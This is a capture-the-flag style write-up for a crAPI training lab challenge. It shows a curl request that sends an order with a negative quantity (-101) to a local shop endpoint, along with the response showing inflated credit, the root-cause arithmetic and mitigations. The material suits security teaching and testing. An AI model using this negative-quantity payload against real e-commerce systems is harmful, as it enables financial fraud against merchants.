# Challenge 9 — Increase your balance by $1,000 or more

**OWASP API Top 10 mapping:** API6:2023 Unrestricted Business Flows / API8:2023 Security Misconfiguration  
**crAPI category:** Mass Assignment

## Goal

Use the same order-creation weakness as Challenge 8 to add at least $1,000 to the user's available credit.

## Vulnerability

The `POST /workshop/api/shop/orders` endpoint still does not validate that `quantity` is positive. By sending a large negative quantity, the attacker receives a large credit refund while the system records a valid order.

## Exploit steps

### 1. Authenticate and identify a product

The seeded `Seat` product costs `$10.00`.

```bash
JWT="<your-jwt>"
```

### 2. Place an order with a large negative quantity

A quantity of `-101` on a `$10.00` item yields a `$1,010.00` credit increase.

```bash
curl -s -X POST \
  -H "Authorization: Bearer $JWT" \
  -H "Content-Type: application/json" \
  http://127.0.0.1:8888/workshop/api/shop/orders \
  -d '{"product_id": 1, "quantity": -101}' | python3 -m json.tool
```

### 3. Observe the result

```json
{
  "id": 6,
  "message": "Order sent successfully.",
  "credit": 1110.0
}
```

Starting from a `$100.00` balance, the account now holds `$1,110.00`.

## Why this works

- The same arithmetic bug exists as in Challenge 8: `user_details.available_credit -= float(product.price * quantity)`.
- Because `quantity` is negative, the subtraction becomes addition.
- No upper or lower bound is enforced on quantity.

## Impact

- Arbitrary inflation of account balance.
- Can be combined with other flows (e.g., fake refunds) to cash out or disrupt the application.
- Demonstrates how a single missing sign check can subvert an entire financial flow.

## Mitigation

See Challenge 8, plus:

- Add **business-rule validation** that rejects orders that would result in a negative total or a credit increase.
- Treat orders, balances, and inventory changes as atomic transactions and reconcile them regularly.
- Log anomalies such as negative quantities or credits exceeding expected thresholds.
